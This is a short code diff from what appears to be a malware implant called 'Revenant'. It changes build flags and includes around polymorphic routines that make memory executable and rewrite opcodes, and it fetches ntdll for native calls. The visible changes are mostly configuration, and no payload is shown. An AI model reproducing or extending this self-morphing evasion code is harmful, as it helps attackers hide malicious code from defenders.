@@ -4,11 +4,15 @@
 
 #include "Config.h"
 #include "Poly.h"
+#include "Revenant.h"
+#include "Strings.h"
+#include "Obfuscation.h"
+#include "Defs.h"
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_POLYMORPHIC == TRUE
 
-VOID morphModule() {
-#if CONFIG_OBFUSCATION
+void morphModule() {
+#if CONFIG_OBFUSCATION == TRUE
 
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_MARKER_MASK;
@@ -118,7 +122,7 @@ VOID morphMemory(PBYTE pbyDst, BYTE byLength)
     // Change the protection of the memory to allow execution and write the morphed opcodes to memory
     DWORD dwOldProtect = 0x0;
 
-#if CONFIG_NATIVE
+#if CONFIG_NATIVE == TRUE
     #if CONFIG_ARCH == x64
     void *p_ntdll = get_ntdll_64();
 #else
